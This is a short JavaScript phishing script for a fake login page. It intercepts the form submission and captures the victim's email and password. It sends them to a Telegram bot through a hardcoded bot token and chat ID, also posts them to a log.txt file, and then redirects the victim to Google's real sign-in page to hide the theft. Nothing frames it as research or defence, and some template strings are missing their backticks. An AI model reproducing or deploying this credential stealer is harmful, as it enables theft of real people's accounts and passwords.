document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const message = Email: ${email}\nPassword: ${password};
  const telegramBotToken = "7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ";
  const chatId = "7817453978";

  fetch(https://api.telegram.org/bot${telegramBotToken}/sendMessage, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });

  fetch("log.txt", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}
  });

  window.location.href = "https://accounts.google.com";
});
